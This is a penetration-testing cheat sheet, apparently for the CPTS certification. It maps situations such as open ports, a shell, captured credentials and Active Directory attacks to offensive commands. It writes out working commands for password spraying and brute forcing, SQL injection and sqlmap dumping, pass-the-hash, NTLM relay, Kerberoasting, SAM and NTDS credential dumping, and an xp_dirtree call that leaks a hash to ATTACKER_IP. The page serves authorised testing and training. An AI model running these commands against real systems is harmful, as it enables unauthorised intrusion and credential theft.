CPTS · Scenario router

Where do I start?.

Where to start when you are in front of a target and need the next command, not a tutorial. Pick your situation, open it, and jump straight to the moves and the tool that does the work. Search filters every play. This is a working reference for authorised testing only.

20 situations

A port is open

Straight off the scan: the first move on each service, then the route to access.

  • SMB (445 / 139) The richest target on a Windows network. Enumerate anonymously, then with a credential.

    1. Null / guest session: shares, users, groups and the password policy in one pass.

      enum4linux-ng -A TARGET
netexec smb TARGET -u '' -p '' --shares
      SMB enumeration →

    2. With a credential: spray, list shares, look for (Pwn3d!) and dump.

      netexec smb TARGET -u users.txt -p 'Welcome1' --continue-on-success
netexec smb TARGET -u user -p pass --shares --sam
      Attacking services →

    3. Local admin? Execute, or relay unsigned SMB.

      impacket-psexec 'DOMAIN/user:pass@TARGET'
      Credential access map →
  • HTTP / HTTPS (80 / 443 / 8080) Fingerprint the stack, discover content, then attack the app.

    1. Identify the stack and find hidden content and vhosts.

      whatweb http://TARGET
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
      Web recon →

    2. Put a proxy in front so you can read and replay every request.

      # browser / tools -> 127.0.0.1:8080 (Burp)
      Web proxies →

    3. Test the inputs: SQLi, LFI, upload, command injection, SSTI.

      ' OR 1=1-- -
sqlmap -u 'http://TARGET/?id=1' --batch --dump
      SQL injection →

    4. Known off-the-shelf app (WordPress, Tomcat, Jenkins, GitLab)?

      searchsploit <app> <version>
      Attacking common applications →
  • FTP (21) Anonymous first, then a login, then what the login lets you do.

    1. Try anonymous, list and pull files.

      ftp TARGET
nmap -p21 --script ftp-anon TARGET
      Attacking services →

    2. Brute a real login with a short list; writable root under a web dir = webshell upload.

      hydra -L users.txt -P pass.txt ftp://TARGET
      Hydra →
  • SSH (22) Keys and weak passwords are the way in.

    1. Throttle to ~4 tasks and brute a known or likely user.

      hydra -L users.txt -P pass.txt -t 4 ssh://TARGET
      Hydra →

    2. Found an id_rsa? Crack it if encrypted, then log in.

      ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
      Password attacks map →
  • RDP (3389) A full desktop with a credential or a hash.

    1. Brute (keep -t low), or connect with a credential.

      hydra -L users.txt -p 'Welcome1' -t 4 rdp://TARGET
xfreerdp /v:TARGET /u:user /p:pass
      RDP access →

    2. Only have the hash? Pass it (needs Restricted Admin).

      xfreerdp /v:TARGET /u:user /pth:NTHASH
      Pass-the-Hash →
  • MSSQL (1433) / MySQL (3306) A database login is often command execution.

    1. Log in, enable and run xp_cmdshell on MSSQL.

      impacket-mssqlclient 'DOMAIN/user:pass@TARGET' -windows-auth
enable_xp_cmdshell; xp_cmdshell 'whoami'
      Database attacks →

    2. Capture the service's NetNTLM hash with a UNC path, then crack/relay.

      EXEC xp_dirtree '\\ATTACKER_IP\share';
      Attacking services →
  • SNMP (161/udp) Community strings leak the whole config.

    1. Guess the community string, then walk it for users, processes and secrets.

      onesixtyone -c community.txt TARGET
snmpwalk -v2c -c public TARGET
      SNMP enumeration →
  • DNS (53) A zone transfer hands you the namespace.

    1. Try a zone transfer, then brute subdomains.

      dig axfr @TARGET DOMAIN
dnsenum --dnsserver TARGET DOMAIN
      Service enumeration →

I have a shell

First execution on a host. Stabilise, enumerate, escalate.

  • The shell is unstable No job control, dies on Ctrl-C.

    1. Upgrade to a full PTY.

      python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm
      Shell upgrade →
  • A Windows shell Enumerate the host and your token, then escalate to SYSTEM.

    1. Who am I, what privileges, what is running.

      whoami /all
systeminfo
tasklist /svc
      Windows quick ops map →

    2. Run a scanner, then exploit the one finding (services, tokens, AlwaysInstallElevated).

      winPEASany.exe
whoami /priv
      Windows privilege escalation →

    3. Dump the local credential stores.

      reg save hklm\sam sam.save & reg save hklm\system system.save
      Dump & crack →
  • A Linux shell Enumerate, walk the privesc primitives, get to root.

    1. Context and the quick wins.

      id; sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
      Linux quick ops map →

    2. Run linPEAS, cross-check SUID/sudo on GTFOBins.

      ./linpeas.sh
      Linux privilege escalation →

    3. Hunt for credentials in configs, history and keys.

      grep -rniE 'password|secret' /var/www /etc /home 2>/dev/null
      Credential hunting →

I have credentials or a hash

Turn a secret into access, or into a password.

  • A plaintext password Spray it, reuse it, log in with it.

    1. Spray across the subnet for reuse, then get a shell.

      netexec smb 10.10.10.0/24 -u user -p 'Password1' --continue-on-success
evil-winrm -i TARGET -u user -p 'Password1'
      NetExec →
  • An NTLM hash Authenticate with the hash, no cracking needed.

    1. Pass the hash over SMB / WinRM, or spray it.

      netexec smb TARGET -u user -H NTHASH --local-auth
evil-winrm -i TARGET -u user -H NTHASH
impacket-psexec user@TARGET -hashes :NTHASH
      Pass-the-Hash →
  • A Kerberos ticket or keytab Reuse a ccache/keytab, or extract the hash from it.

    1. Point tools at the ccache, or import a keytab.

      export KRB5CCNAME=/tmp/krb5cc_...
kinit user@REALM -k -t user.keytab
klist
      Pass-the-Ticket →
  • A captured hash Identify the type, then crack it.

    1. Name the format, then wordlist + rules.

      hashid 'HASH'
hashcat -m <mode> hashes.txt rockyou.txt -r best64.rule
      Password attacks map →
  • A protected file (zip / kdbx / office) Extract a crackable hash with a *2john tool.

    1. Convert, then crack.

      keepass2john Database.kdbx > kp.hash
john --wordlist=rockyou.txt kp.hash
      Hashcat / John →

I'm attacking Active Directory

The domain: from no creds to Domain Admin.

  • On the internal network, no credentials Poison, relay and name the domain.

    1. Poison LLMNR/NBT-NS to capture NetNTLMv2 hashes.

      sudo responder -I eth0
      Responder →

    2. Relay that auth to an unsigned host instead of cracking.

      impacket-ntlmrelayx -tf targets.txt -smb2support
      NTLM relay →

    3. Find the domain and enumerate users for a spray.

      nmap -p88,389 --script krb5-enum-users,ldap-rootdse TARGET
kerbrute userenum --dc TARGET -d domain.local users.txt
      Kerbrute →
  • I have a domain credential Map the domain and find the path.

    1. Collect BloodHound data and read the shortest path to DA.

      bloodhound-python -u user -p pass -d domain.local -c all -ns TARGET
      BloodHound →

    2. Roast: Kerberoast service accounts and AS-REP roast pre-auth-less users.

      impacket-GetUserSPNs -request 'domain.local/user:pass'
impacket-GetNPUsers domain.local/ -usersfile users.txt
      Kerberos attacks →
  • I need to move to another host Pass what you have: hash, key, ticket or certificate.

    1. Pick the technique for what you hold.

      # hash -> Pass-the-Hash; key -> OverPass-the-Hash; cert -> PKINIT; ticket -> Pass-the-Ticket
      Credential access & lateral movement →
  • I have Domain Admin Dump everything and prove it.

    1. DCSync or dump NTDS.dit for every domain hash.

      impacket-secretsdump 'domain.local/user:pass@DC' -just-dc-ntlm
netexec smb DC -u user -p pass -M ntdsutil
      NTDS dump →
